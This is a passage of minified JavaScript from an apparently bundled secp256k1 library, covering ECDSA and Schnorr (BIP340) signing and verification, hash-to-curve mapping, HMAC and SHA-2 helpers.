                    `Point of length ${t} was invalid. Expected ${i} compressed bytes or ${o} uncompressed bytes`
                  );
                }
                {
                  const e = B(s);
                  if (!(ue < (a = e) && a < r.ORDER))
                    throw new Error("Point is not on curve");
                  const t = u(e);
                  let i = r.sqrt(t);
                  return (
                    (1 === (1 & n)) !== ((i & fe) === fe) && (i = r.neg(i)),
                    { x: e, y: i }
                  );
                }
                var a;
              },
            }),
            h = (e) => C(_(e, t.nByteLength));
          function d(e) {
            return e > n >> fe;
          }
          const p = (e, t, n) => B(e.slice(t, n));
          class g {
            constructor(e, t, n) {
              (this.r = e),
                (this.s = t),
                (this.recovery = n),
                this.assertValidity();
            }
            static fromCompact(e) {
              const n = t.nByteLength;
              return (
                (e = N("compactSignature", e, 2 * n)),
                new g(p(e, 0, n), p(e, n, 2 * n))
              );
            }
            static fromDER(e) {
              const { r: t, s: n } = ce.toSig(N("DER", e));
              return new g(t, n);
            }
            assertValidity() {
              if (!f(this.r)) throw new Error("r must be 0 < r < CURVE.n");
              if (!f(this.s)) throw new Error("s must be 0 < s < CURVE.n");
            }
            addRecoveryBit(e) {
              return new g(this.r, this.s, e);
            }
            recoverPublicKey(e) {
              const { r: n, s: i, recovery: o } = this,
                c = b(N("msgHash", e));
              if (null == o || ![0, 1, 2, 3].includes(o))
                throw new Error("recovery id invalid");
              const u = 2 === o || 3 === o ? n + t.n : n;
              if (u >= r.ORDER) throw new Error("recovery id 2 or 3 invalid");
              const f = 0 === (1 & o) ? "02" : "03",
                d = l.fromHex(f + h(u)),
                p = a(u),
                g = s(-c * p),
                y = s(i * p),
                w = l.BASE.multiplyAndAddUnsafe(d, g, y);
              if (!w) throw new Error("point at infinify");
              return w.assertValidity(), w;
            }
            hasHighS() {
              return d(this.s);
            }
            normalizeS() {
              return this.hasHighS()
                ? new g(this.r, s(-this.s), this.recovery)
                : this;
            }
            toDERRawBytes() {
              return O(this.toDERHex());
            }
            toDERHex() {
              return ce.hexFromSig({ r: this.r, s: this.s });
            }
            toCompactRawBytes() {
              return O(this.toCompactHex());
            }
            toCompactHex() {
              return h(this.r) + h(this.s);
            }
          }
          const y = {
            isValidPrivateKey(e) {
              try {
                return c(e), !0;
              } catch (t) {
                return !1;
              }
            },
            normPrivateKeyToScalar: c,
            randomPrivateKey: () => {
              const e = (function (e, t) {
                let n =
                  arguments.length > 2 &&
                  void 0 !== arguments[2] &&
                  arguments[2];
                const r = (e = N("privateHash", e)).length,
                  i = re(t).nByteLength + 8;
                if (i < 24 || r < i || r > 1024)
                  throw new Error(
                    `hashToPrivateScalar: expected ${i}-1024 bytes of input, got ${r}`
                  );
                return Z(n ? P(e) : B(e), t - K) + K;
              })(t.randomBytes(r.BYTES + 8), n);
              return _(e, t.nByteLength);
            },
            precompute() {
              let e =
                  arguments.length > 0 && void 0 !== arguments[0]
                    ? arguments[0]
                    : 8,
                t =
                  arguments.length > 1 && void 0 !== arguments[1]
                    ? arguments[1]
                    : l.BASE;
              return t._setWindowSize(e), t.multiply(BigInt(3)), t;
            },
          };
          function w(e) {
            const t = e instanceof Uint8Array,
              n = "string" === typeof e,
              r = (t || n) && e.length;
            return t
              ? r === i || r === o
              : n
              ? r === 2 * i || r === 2 * o
              : e instanceof l;
          }
          const m =
              t.bits2int ||
              function (e) {
                const n = B(e),
                  r = 8 * e.length - t.nBitLength;
                return r > 0 ? n >> BigInt(r) : n;
              },
            b =
              t.bits2int_modN ||
              function (e) {
                return s(m(e));
              },
            v = $(t.nBitLength);
          function E(e) {
            if ("bigint" !== typeof e) throw new Error("bigint expected");
            if (!(ue <= e && e < v))
              throw new Error(`bigint expected < 2^${t.nBitLength}`);
            return _(e, t.nByteLength);
          }
          function S(e, n) {
            let i =
              arguments.length > 2 && void 0 !== arguments[2]
                ? arguments[2]
                : x;
            if (["recovered", "canonical"].some((e) => e in i))
              throw new Error("sign() legacy options not supported");
            const { hash: o, randomBytes: u } = t;
            let { lowS: h, prehash: p, extraEntropy: w } = i;
            null == h && (h = !0),
              (e = N("msgHash", e)),
              p && (e = N("prehashed msgHash", o(e)));
            const v = b(e),
              S = c(n),
              A = [E(S), E(v)];
            if (null != w) {
              const e = !0 === w ? u(r.BYTES) : w;
              A.push(N("extraEntropy", e, r.BYTES));
            }
            const k = R(...A),
              T = v;
            return {
              seed: k,
              k2sig: function (e) {
                const t = m(e);
                if (!f(t)) return;
                const n = a(t),
                  r = l.BASE.multiply(t).toAffine(),
                  i = s(r.x);
                if (i === ue) return;
                const o = B(y.randomPrivateKey()),
                  c = a(o),
                  u = s(o * S * i),
                  p = s(o * T),
                  w = s(c * s(u + p)),
                  b = s(n * w);
                if (b === ue) return;
                let v = (r.x === i ? 0 : 2) | Number(r.y & fe),
                  E = b;
                return (
                  h &&
                    d(b) &&
                    ((E = (function (e) {
                      return d(e) ? s(-e) : e;
                    })(b)),
                    (v ^= 1)),
                  new g(i, E, v)
                );
              },
            };
          }
          const x = { lowS: t.lowS, prehash: !1 },
            A = { lowS: t.lowS, prehash: !1 };
          return (
            l.BASE._setWindowSize(8),
            {
              CURVE: t,
              getPublicKey: function (e) {
                let t =
                  !(arguments.length > 1 && void 0 !== arguments[1]) ||
                  arguments[1];
                return l.fromPrivateKey(e).toRawBytes(t);
              },
              getSharedSecret: function (e, t) {
                let n =
                  !(arguments.length > 2 && void 0 !== arguments[2]) ||
                  arguments[2];
                if (w(e)) throw new Error("first arg must be private key");
                if (!w(t)) throw new Error("second arg must be public key");
                return l.fromHex(t).multiply(c(e)).toRawBytes(n);
              },
              sign: function (e, n) {
                let r =
                  arguments.length > 2 && void 0 !== arguments[2]
                    ? arguments[2]
                    : x;
                const { seed: i, k2sig: o } = S(e, n, r);
                return M(t.hash.outputLen, t.nByteLength, t.hmac)(i, o);
              },
              verify: function (e, n, r) {
                var i;
                let o =
                  arguments.length > 3 && void 0 !== arguments[3]
                    ? arguments[3]
                    : A;
                const c = e;
                if (
                  ((n = N("msgHash", n)),
                  (r = N("publicKey", r)),
                  "strict" in o)
                )
                  throw new Error("options.strict was renamed to lowS");
                const { lowS: u, prehash: f } = o;
                let h, d;
                try {
                  if ("string" === typeof c || c instanceof Uint8Array)
                    try {
                      h = g.fromDER(c);
                    } catch (x) {
                      if (!(x instanceof ce.Err)) throw x;
                      h = g.fromCompact(c);
                    }
                  else {
                    if (
                      "object" !== typeof c ||
                      "bigint" !== typeof c.r ||
                      "bigint" !== typeof c.s
                    )
                      throw new Error("PARSE");
                    {
                      const { r: e, s: t } = c;
                      h = new g(e, t);
                    }
                  }
                  d = l.fromHex(r);
                } catch (k) {
                  if ("PARSE" === k.message)
                    throw new Error(
                      "signature must be Signature instance, Uint8Array or hex string"
                    );
                  return !1;
                }
                if (u && h.hasHighS()) return !1;
                f && (n = t.hash(n));
                const { r: p, s: y } = h,
                  w = b(n),
                  m = a(y),
                  v = s(w * m),
                  E = s(p * m),
                  S =
                    null === (i = l.BASE.multiplyAndAddUnsafe(d, v, E)) ||
                    void 0 === i
                      ? void 0
                      : i.toAffine();
                return !!S && s(S.x) === p;
              },
              ProjectivePoint: l,
              Signature: g,
              utils: y,
            }
          );
        }
        const pe = B;
        function ge(e, t) {
          if (e < 0 || e >= 1 << (8 * t))
            throw new Error(`bad I2OSP call: value=${e} length=${t}`);
          const n = Array.from({ length: t }).fill(0);
          for (let r = t - 1; r >= 0; r--) (n[r] = 255 & e), (e >>>= 8);
          return new Uint8Array(n);
        }
        function ye(e, t) {
          const n = new Uint8Array(e.length);
          for (let r = 0; r < e.length; r++) n[r] = e[r] ^ t[r];
          return n;
        }
        function we(e) {
          if (!(e instanceof Uint8Array))
            throw new Error("Uint8Array expected");
        }
        function me(e) {
          if (!Number.isSafeInteger(e)) throw new Error("number expected");
        }
        function be(e, t, n) {
          const { p: r, k: i, m: o, hash: s, expand: a, DST: l } = n;
          we(e), me(t);
          const c = (function (e) {
              if (e instanceof Uint8Array) return e;
              if ("string" === typeof e) return L(e);
              throw new Error("DST must be Uint8Array or string");
            })(l),
            u = r.toString(2).length,
            f = Math.ceil((u + i) / 8),
            h = t * o * f;
          let d;
          if ("xmd" === a)
            d = (function (e, t, n, r) {
              we(e),
                we(t),
                me(n),
                t.length > 255 && (t = r(R(L("H2C-OVERSIZE-DST-"), t)));
              const { outputLen: i, blockLen: o } = r,
                s = Math.ceil(n / i);
              if (s > 255) throw new Error("Invalid xmd length");
              const a = R(t, ge(t.length, 1)),
                l = ge(0, o),
                c = ge(n, 2),
                u = new Array(s),
                f = r(R(l, e, c, ge(0, 1), a));
              u[0] = r(R(f, ge(1, 1), a));
              for (let h = 1; h <= s; h++) {
                const e = [ye(f, u[h - 1]), ge(h + 1, 1), a];
                u[h] = r(R(...e));
              }
              return R(...u).slice(0, n);
            })(e, c, h, s);
          else if ("xof" === a)
            d = (function (e, t, n, r, i) {
              if ((we(e), we(t), me(n), t.length > 255)) {
                const e = Math.ceil((2 * r) / 8);
                t = i
                  .create({ dkLen: e })
                  .update(L("H2C-OVERSIZE-DST-"))
                  .update(t)
                  .digest();
              }
              if (n > 65535 || t.length > 255)
                throw new Error("expand_message_xof: invalid lenInBytes");
              return i
                .create({ dkLen: n })
                .update(e)
                .update(ge(n, 2))
                .update(t)
                .update(ge(t.length, 1))
                .digest();
            })(e, c, h, i, s);
          else {
            if (void 0 !== a)
              throw new Error('expand must be "xmd", "xof" or undefined');
            d = e;
          }
          const p = new Array(t);
          for (let g = 0; g < t; g++) {
            const e = new Array(o);
            for (let t = 0; t < o; t++) {
              const n = f * (t + g * o),
                i = d.subarray(n, n + f);
              e[t] = Z(pe(i), r);
            }
            p[g] = e;
          }
          return p;
        }
        class ve extends h {
          constructor(e, t) {
            super(), (this.finished = !1), (this.destroyed = !1), a.hash(e);
            const n = f(t);
            if (
              ((this.iHash = e.create()),
              "function" !== typeof this.iHash.update)
            )
              throw new TypeError(
                "Expected instance of class which extends utils.Hash"
              );
            (this.blockLen = this.iHash.blockLen),
              (this.outputLen = this.iHash.outputLen);
            const r = this.blockLen,
              i = new Uint8Array(r);
            i.set(n.length > r ? e.create().update(n).digest() : n);
            for (let o = 0; o < i.length; o++) i[o] ^= 54;
            this.iHash.update(i), (this.oHash = e.create());
            for (let o = 0; o < i.length; o++) i[o] ^= 106;
            this.oHash.update(i), i.fill(0);
          }
          update(e) {
            return a.exists(this), this.iHash.update(e), this;
          }
          digestInto(e) {
            a.exists(this),
              a.bytes(e, this.outputLen),
              (this.finished = !0),
              this.iHash.digestInto(e),
              this.oHash.update(e),
              this.oHash.digestInto(e),
              this.destroy();
          }
          digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e), e;
          }
          _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {
              oHash: t,
              iHash: n,
              finished: r,
              destroyed: i,
              blockLen: o,
              outputLen: s,
            } = this;
            return (
              (e.finished = r),
              (e.destroyed = i),
              (e.blockLen = o),
              (e.outputLen = s),
              (e.oHash = t._cloneInto(e.oHash)),
              (e.iHash = n._cloneInto(e.iHash)),
              e
            );
          }
          destroy() {
            (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
          }
        }
        const Ee = (e, t, n) => new ve(e, t).update(n).digest();
        function Se(e) {
          return {
            hash: e,
            hmac: function (t) {
              for (
                var n = arguments.length,
                  r = new Array(n > 1 ? n - 1 : 0),
                  i = 1;
                i < n;
                i++
              )
                r[i - 1] = arguments[i];
              return Ee(
                e,
                t,
                (function () {
                  for (
                    var e = arguments.length, t = new Array(e), n = 0;
                    n < e;
                    n++
                  )
                    t[n] = arguments[n];
                  if (!t.every((e) => e instanceof Uint8Array))
                    throw new Error("Uint8Array list expected");
                  if (1 === t.length) return t[0];
                  const r = t.reduce((e, t) => e + t.length, 0),
                    i = new Uint8Array(r);
                  for (let o = 0, s = 0; o < t.length; o++) {
                    const e = t[o];
                    i.set(e, s), (s += e.length);
                  }
                  return i;
                })(...r)
              );
            },
            randomBytes: p,
          };
        }
        Ee.create = (e, t) => new ve(e, t);
        const xe = BigInt(
            "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2f"
          ),
          Ae = BigInt(
            "0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141"
          ),
          ke = BigInt(1),
          Te = BigInt(2),
          Ce = (e, t) => (e + t / Te) / t;
        function Ie(e) {
          const t = xe,
            n = BigInt(3),
            r = BigInt(6),
            i = BigInt(11),
            o = BigInt(22),
            s = BigInt(23),
            a = BigInt(44),
            l = BigInt(88),
            c = (e * e * e) % t,
            u = (c * c * e) % t,
            f = (X(u, n, t) * u) % t,
            h = (X(f, n, t) * u) % t,
            d = (X(h, Te, t) * c) % t,
            p = (X(d, i, t) * d) % t,
            g = (X(p, o, t) * p) % t,
            y = (X(g, a, t) * g) % t,
            w = (X(y, l, t) * y) % t,
            m = (X(w, a, t) * g) % t,
            b = (X(m, n, t) * u) % t,
            v = (X(b, s, t) * p) % t,
            E = (X(v, r, t) * c) % t,
            S = X(E, Te, t);
          if (!Oe.eql(Oe.sqr(S), e)) throw new Error("Cannot find square root");
          return S;
        }
        const Oe = (function (e, t) {
            let n =
                arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
              r =
                arguments.length > 3 && void 0 !== arguments[3]
                  ? arguments[3]
                  : {};
            if (e <= z) throw new Error(`Expected Fp ORDER > 0, got ${e}`);
            const { nBitLength: i, nByteLength: o } = re(e, t);
            if (o > 2048)
              throw new Error(
                "Field lengths over 2048 bytes are not supported"
              );
            const s = ee(e),
              a = Object.freeze({
                ORDER: e,
                BITS: i,
                BYTES: o,
                MASK: $(i),
                ZERO: z,
                ONE: K,
                create: (t) => Z(t, e),
                isValid: (t) => {
                  if ("bigint" !== typeof t)
                    throw new Error(
                      "Invalid field element: expected bigint, got " + typeof t
                    );
                  return z <= t && t < e;
                },
                is0: (e) => e === z,
                isOdd: (e) => (e & K) === K,
                neg: (t) => Z(-t, e),
                eql: (e, t) => e === t,
                sqr: (t) => Z(t * t, e),
                add: (t, n) => Z(t + n, e),
                sub: (t, n) => Z(t - n, e),
                mul: (t, n) => Z(t * n, e),
                pow: (e, t) =>
                  (function (e, t, n) {
                    if (n < z) throw new Error("Expected power > 0");
                    if (n === z) return e.ONE;
                    if (n === K) return t;
                    let r = e.ONE,
                      i = t;
                    for (; n > z; )
                      n & K && (r = e.mul(r, i)), (i = e.sqr(i)), (n >>= 1n);
                    return r;
                  })(a, e, t),
                div: (t, n) => Z(t * Q(n, e), e),
                sqrN: (e) => e * e,
                addN: (e, t) => e + t,
                subN: (e, t) => e - t,
                mulN: (e, t) => e * t,
                inv: (t) => Q(t, e),
                sqrt: r.sqrt || ((e) => s(a, e)),
                invertBatch: (e) =>
                  (function (e, t) {
                    const n = new Array(t.length),
                      r = t.reduce(
                        (t, r, i) => (e.is0(r) ? t : ((n[i] = t), e.mul(t, r))),
                        e.ONE
                      ),
                      i = e.inv(r);
                    return (
                      t.reduceRight(
                        (t, r, i) =>
                          e.is0(r) ? t : ((n[i] = e.mul(t, n[i])), e.mul(t, r)),
                        i
                      ),
                      n
                    );
                  })(a, e),
                cmov: (e, t, n) => (n ? t : e),
                toBytes: (e) => (n ? U(e, o) : _(e, o)),
                fromBytes: (e) => {
                  if (e.length !== o)
                    throw new Error(
                      `Fp.fromBytes: expected ${o}, got ${e.length}`
                    );
                  return n ? P(e) : B(e);
                },
              });
            return Object.freeze(a);
          })(xe, void 0, void 0, { sqrt: Ie }),
          Be = (function (e, t) {
            const n = (t) => de({ ...e, ...Se(t) });
            return Object.freeze({ ...n(t), create: n });
          })(
            {
              a: BigInt(0),
              b: BigInt(7),
              Fp: Oe,
              n: Ae,
              Gx: BigInt(
                "55066263022277343669578718895168534326250603453777594175500187360389116729240"
              ),
              Gy: BigInt(
                "32670510020758816978083085130507043184471273380659243275938904335757337482424"
              ),
              h: BigInt(1),
              lowS: !0,
              endo: {
                beta: BigInt(
                  "0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee"
                ),
                splitScalar: (e) => {
                  const t = Ae,
                    n = BigInt("0x3086d221a7d46bcde86c90e49284eb15"),
                    r = -ke * BigInt("0xe4437ed6010e88286f547fa90abfe4c3"),
                    i = BigInt("0x114ca50f7a8e2f3f657c1108d9d44cfd8"),
                    o = n,
                    s = BigInt("0x100000000000000000000000000000000"),
                    a = Ce(o * e, t),
                    l = Ce(-r * e, t);
                  let c = Z(e - a * n - l * i, t),
                    u = Z(-a * r - l * o, t);
                  const f = c > s,
                    h = u > s;
                  if ((f && (c = t - c), h && (u = t - u), c > s || u > s))
                    throw new Error("splitScalar: Endomorphism failed, k=" + e);
                  return { k1neg: f, k1: c, k2neg: h, k2: u };
                },
              },
            },
            S
          ),
          Pe = BigInt(0),
          _e = (e) => "bigint" === typeof e && Pe < e && e < xe,
          Ue = (e) => "bigint" === typeof e && Pe < e && e < Ae,
          Ne = {};
        function Re(e) {
          let t = Ne[e];
          if (void 0 === t) {
            const n = S(Uint8Array.from(e, (e) => e.charCodeAt(0)));
            (t = R(n, n)), (Ne[e] = t);
          }
          for (
            var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1;
            i < n;
            i++
          )
            r[i - 1] = arguments[i];
          return S(R(t, ...r));
        }
        const Le = (e) => e.toRawBytes(!0).slice(1),
          $e = (e) => _(e, 32),
          He = (e) => Z(e, xe),
          De = (e) => Z(e, Ae),
          Me = Be.ProjectivePoint,
          Fe = (e, t, n) => Me.BASE.multiplyAndAddUnsafe(e, t, n);
        function je(e) {
          const t = Be.utils.normPrivateKeyToScalar(e),
            n = Me.fromPrivateKey(t),
            r = n.hasEvenY() ? t : De(-t);
          return { point: n, scalar: r, bytes: Le(n) };
        }
        function ze(e) {
          if (!_e(e)) throw new Error("bad x: need 0 < x < p");
          const t = He(e * e);
          let n = Ie(He(t * e + BigInt(7)));
          n % 2n !== 0n && (n = He(-n));
          const r = new Me(e, n, ke);
          return r.assertValidity(), r;
        }
        function Ke() {
          for (var e = arguments.length, t = new Array(e), n = 0; n < e; n++)
            t[n] = arguments[n];
          return De(B(Re("BIP0340/challenge", ...t)));
        }
        function We(e, t, n) {
          const r = N("signature", e, 64),
            i = N("message", t),
            o = N("publicKey", n, 32);
          try {
            const e = ze(B(o)),
              t = B(r.subarray(0, 32));
            if (!_e(t)) return !1;
            const n = B(r.subarray(32, 64));
            if (!Ue(n)) return !1;
            const s = Ke($e(t), Le(e), i),
              a = Fe(e, n, De(-s));
            return !(!a || !a.hasEvenY() || a.toAffine().x !== t);
          } catch (s) {
            return !1;
          }
        }
        const Ve = {
            getPublicKey: function (e) {
              return je(e).bytes;
            },
            sign: function (e, t) {
              let n =
                arguments.length > 2 && void 0 !== arguments[2]
                  ? arguments[2]
                  : p(32);
              const r = N("message", e),
                { bytes: i, scalar: o } = je(t),
                s = N("auxRand", n, 32),
                a = $e(o ^ B(Re("BIP0340/aux", s))),
                l = Re("BIP0340/nonce", a, i, r),
                c = De(B(l));
              if (c === Pe) throw new Error("sign failed: k is zero");
              const { point: u, bytes: f, scalar: h } = je(c),
                d = Ke(f, i, r),
                g = new Uint8Array(64);
              if (
                (g.set($e(u.px), 0), g.set($e(De(h + d * o)), 32), !We(g, r, i))
              )
                throw new Error("sign: Invalid signature produced");
              return g;
            },
            verify: We,
            utils: {
              randomPrivateKey: Be.utils.randomPrivateKey,
              getExtendedPublicKey: je,
              lift_x: ze,
              pointToBytes: Le,
              numberToBytesBE: _,
              bytesToNumberBE: B,
              taggedHash: Re,
              mod: Z,
            },
          },
          qe = (function (e, t) {
            const n = t.map((e) => Array.from(e).reverse());
            return (t, r) => {
              const [i, o, s, a] = n.map((n) =>
                n.reduce((n, r) => e.add(e.mul(n, t), r))
              );
              return (
                (t = e.div(i, o)), (r = e.mul(r, e.div(s, a))), { x: t, y: r }
              );
            };
          })(
            Oe,
            [
              [
                "0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa8c7",
                "0x7d3d4c80bc321d5b9f315cea7fd44c5d595d2fc0bf63b92dfff1044f17c6581",
                "0x534c328d23f234e6e2a413deca25caece4506144037c40314ecbd0b53d9dd262",
                "0x8e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38e38daaaaa88c",
              ],
              [
                "0xd35771193d94918a9ca34ccbb7b640dd86cd409542f8487d9fe6b745781eb49b",
                "0xedadc6f64383dc1df7c4b2d51b54225406d36b641f5e41bbc52a56612a8c6d14",
                "0x0000000000000000000000000000000000000000000000000000000000000001",
              ],
              [
                "0x4bda12f684bda12f684bda12f684bda12f684bda12f684bda12f684b8e38e23c",
                "0xc75e0c32d5cb7c0fa9d0a54b12a0a6d5647ab046d686da6fdffc90fc201d71a3",
                "0x29a6194691f91a73715209ef6512e576722830a201be2018a765e85a9ecee931",
                "0x2f684bda12f684bda12f684bda12f684bda12f684bda12f684bda12f38e38d84",
              ],
              [
                "0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffff93b",
                "0x7a06534bb8bdb49fd5e9e6632722c2989467c1bfc8e8d978dfb425d2685c2573",
                "0x6484aa716545ca2cf3a70c3fa8fe337e0a3d21162f0d6299a7bf8192bfd2a76f",
                "0x0000000000000000000000000000000000000000000000000000000000000001",
              ],
            ].map((e) => e.map((e) => BigInt(e)))
          ),
          Ge = (function (e, t) {
            if ((ne(e), !e.isValid(t.A) || !e.isValid(t.B) || !e.isValid(t.Z)))
              throw new Error("mapToCurveSimpleSWU: invalid opts");
            const n = (function (e, t) {
              const n = e.ORDER;
              let r = 0n;
              for (let h = n - 1n; h % 2n === 0n; h /= 2n) r += 1n;
              const i = r,
                o = (n - 1n) / 2n ** i,
                s = (o - 1n) / 2n,
                a = 2n ** i - 1n,
                l = 2n ** (i - 1n),
                c = e.pow(t, o),
                u = e.pow(t, (o + 1n) / 2n);
              let f = (t, n) => {
                let r = c,
                  o = e.pow(n, a),
                  f = e.sqr(o);
                f = e.mul(f, n);
                let h = e.mul(t, f);
                (h = e.pow(h, s)),
                  (h = e.mul(h, o)),
                  (o = e.mul(h, n)),
                  (f = e.mul(h, t));
                let d = e.mul(f, o);
                h = e.pow(d, l);
                let p = e.eql(h, e.ONE);
                (o = e.mul(f, u)),
                  (h = e.mul(d, r)),
                  (f = e.cmov(o, f, p)),
                  (d = e.cmov(h, d, p));
                for (let s = i; s > 1; s--) {
                  let t = 2n ** (s - 2n),
                    n = e.pow(d, t);
                  const i = e.eql(n, e.ONE);
                  (o = e.mul(f, r)),
                    (r = e.mul(r, r)),
                    (n = e.mul(d, r)),
                    (f = e.cmov(o, f, i)),
                    (d = e.cmov(n, d, i));
                }
                return { isValid: p, value: f };
              };
              if (e.ORDER % 4n === 3n) {
                const n = (e.ORDER - 3n) / 4n,
                  r = e.sqrt(e.neg(t));
                f = (t, i) => {
                  let o = e.sqr(i);
                  const s = e.mul(t, i);
                  o = e.mul(o, s);
                  let a = e.pow(o, n);
                  a = e.mul(a, s);
                  const l = e.mul(a, r),
                    c = e.mul(e.sqr(a), i),
                    u = e.eql(c, t);
                  return { isValid: u, value: e.cmov(l, a, u) };
                };
              }
              return f;
            })(e, t.Z);
            if (!e.isOdd) throw new Error("Fp.isOdd is not implemented!");
            return (r) => {
              let i, o, s, a, l, c, u, f;
              (i = e.sqr(r)),
                (i = e.mul(i, t.Z)),
                (o = e.sqr(i)),
                (o = e.add(o, i)),
                (s = e.add(o, e.ONE)),
                (s = e.mul(s, t.B)),
                (a = e.cmov(t.Z, e.neg(o), !e.eql(o, e.ZERO))),
                (a = e.mul(a, t.A)),
                (o = e.sqr(s)),
                (c = e.sqr(a)),
                (l = e.mul(c, t.A)),
                (o = e.add(o, l)),
                (o = e.mul(o, s)),
                (c = e.mul(c, a)),
                (l = e.mul(c, t.B)),
                (o = e.add(o, l)),
                (u = e.mul(i, s));
              const { isValid: h, value: d } = n(o, c);
              (f = e.mul(i, r)),
                (f = e.mul(f, d)),
                (u = e.cmov(u, s, h)),
                (f = e.cmov(f, d, h));
              const p = e.isOdd(r) === e.isOdd(f);
              return (
                (f = e.cmov(e.neg(f), f, p)), (u = e.div(u, a)), { x: u, y: f }
              );
            };
          })(Oe, {
            A: BigInt(
              "0x3f8731abdd661adca08a5558f0f5d272e953d363cb6f0e5d405447c01a444533"
            ),
            B: BigInt("1771"),
            Z: Oe.create(BigInt("-11")),
          }),
          { hashToCurve: Ye, encodeToCurve: Ze } = (function (e, t, n) {
            if (
              (j(n, {
                DST: "string",
                p: "bigint",
                m: "isSafeInteger",
                k: "isSafeInteger",
                hash: "hash",
              }),
              "function" !== typeof t)
            )
              throw new Error("mapToCurve() must be defined");
            return {
              hashToCurve(r, i) {
                const o = be(r, 2, { ...n, DST: n.DST, ...i }),
                  s = e.fromAffine(t(o[0])),
                  a = e.fromAffine(t(o[1])),
                  l = s.add(a).clearCofactor();
                return l.assertValidity(), l;
              },
              encodeToCurve(r, i) {
                const o = be(r, 1, { ...n, DST: n.encodeDST, ...i }),
                  s = e.fromAffine(t(o[0])).clearCofactor();
                return s.assertValidity(), s;
              },
            };
          })(
            Be.ProjectivePoint,
            (e) => {
              const { x: t, y: n } = Ge(Oe.create(e[0]));
              return qe(t, n);
            },
            {
              DST: "secp256k1_XMD:SHA-256_SSWU_RO_",
              encodeDST: "secp256k1_XMD:SHA-256_SSWU_NU_",
              p: Oe.ORDER,
              m: 1,
              k: 128,
              expand: "xmd",
              hash: S,
            }
          );
        function Je(e) {
          if (!Number.isSafeInteger(e) || e < 0)
            throw new Error(`Wrong positive integer: ${e}`);
        }
        function Xe(e) {
          if (!(e instanceof Uint8Array))
            throw new TypeError("Expected Uint8Array");
          for (
            var t = arguments.length, n = new Array(t > 1 ? t - 1 : 0), r = 1;
            r < t;
            r++
          )
            n[r - 1] = arguments[r];
          if (n.length > 0 && !n.includes(e.length))
            throw new TypeError(
              `Expected Uint8Array of length ${n}, not of length=${e.length}`
            );
        }
        const Qe = {
            number: Je,
            bool: function (e) {
              if ("boolean" !== typeof e)
                throw new Error(`Expected boolean, not ${e}`);
            },
            bytes: Xe,
            hash: function (e) {
              if ("function" !== typeof e || "function" !== typeof e.create)
                throw new Error(
                  "Hash should be wrapped by utils.wrapConstructor"
                );
              Je(e.outputLen), Je(e.blockLen);
            },
            exists: function (e) {
              let t =
                !(arguments.length > 1 && void 0 !== arguments[1]) ||
                arguments[1];
              if (e.destroyed)
                throw new Error("Hash instance has been destroyed");
              if (t && e.finished)
                throw new Error("Hash#digest() has already been called");
            },
            output: function (e, t) {
              Xe(e);
              const n = t.outputLen;
              if (e.length < n)
                throw new Error(
                  `digestInto() expects output buffer of length at least ${n}`
                );
            },
          },
          et = Qe,
          tt =
            ("object" === typeof self && "crypto" in self && self.crypto,
            (e) => new DataView(e.buffer, e.byteOffset, e.byteLength)),
          nt = (e, t) => (e << (32 - t)) | (e >>> t);
        if (!(68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0]))
          throw new Error("Non little-endian hardware is not supported");
        Array.from({ length: 256 }, (e, t) => t.toString(16).padStart(2, "0"));
        function rt(e) {
          if (
            ("string" === typeof e &&
              (e = (function (e) {
                if ("string" !== typeof e)
                  throw new TypeError(
                    "utf8ToBytes expected string, got " + typeof e
                  );
                return new TextEncoder().encode(e);
              })(e)),
            !(e instanceof Uint8Array))
          )
            throw new TypeError(
              `Expected input type is Uint8Array (got ${typeof e})`
            );
          return e;
        }
        class it {
          clone() {
            return this._cloneInto();
          }
        }
        function ot(e) {
          const t = (t) => e().update(rt(t)).digest(),
            n = e();
          return (
            (t.outputLen = n.outputLen),
            (t.blockLen = n.blockLen),
            (t.create = () => e()),
            t
          );
        }
        class st extends it {
          constructor(e, t, n, r) {
            super(),
              (this.blockLen = e),
              (this.outputLen = t),
              (this.padOffset = n),
              (this.isLE = r),
              (this.finished = !1),
              (this.length = 0),
              (this.pos = 0),
              (this.destroyed = !1),
              (this.buffer = new Uint8Array(e)),
              (this.view = tt(this.buffer));
          }
          update(e) {
            et.exists(this);
            const { view: t, buffer: n, blockLen: r } = this,
              i = (e = rt(e)).length;
            for (let o = 0; o < i; ) {
              const s = Math.min(r - this.pos, i - o);
              if (s !== r)
                n.set(e.subarray(o, o + s), this.pos),
                  (this.pos += s),
                  (o += s),
                  this.pos === r && (this.process(t, 0), (this.pos = 0));
              else {
                const t = tt(e);
                for (; r <= i - o; o += r) this.process(t, o);
              }
            }
            return (this.length += e.length), this.roundClean(), this;
          }
          digestInto(e) {
            et.exists(this), et.output(e, this), (this.finished = !0);
            const { buffer: t, view: n, blockLen: r, isLE: i } = this;
            let { pos: o } = this;
            (t[o++] = 128),
              this.buffer.subarray(o).fill(0),
              this.padOffset > r - o && (this.process(n, 0), (o = 0));
            for (let u = o; u < r; u++) t[u] = 0;
            !(function (e, t, n, r) {
              if ("function" === typeof e.setBigUint64)
                return e.setBigUint64(t, n, r);
              const i = BigInt(32),
                o = BigInt(4294967295),
                s = Number((n >> i) & o),
                a = Number(n & o),
                l = r ? 4 : 0,
                c = r ? 0 : 4;
              e.setUint32(t + l, s, r), e.setUint32(t + c, a, r);
            })(n, r - 8, BigInt(8 * this.length), i),
              this.process(n, 0);
            const s = tt(e),
              a = this.outputLen;
            if (a % 4)
              throw new Error("_sha2: outputLen should be aligned to 32bit");
            const l = a / 4,
              c = this.get();
            if (l > c.length)
              throw new Error("_sha2: outputLen bigger than state");
            for (let u = 0; u < l; u++) s.setUint32(4 * u, c[u], i);
          }
          digest() {
            const { buffer: e, outputLen: t } = this;
            this.digestInto(e);
            const n = e.slice(0, t);
            return this.destroy(), n;
          }
          _cloneInto(e) {
            e || (e = new this.constructor()), e.set(...this.get());
            const {
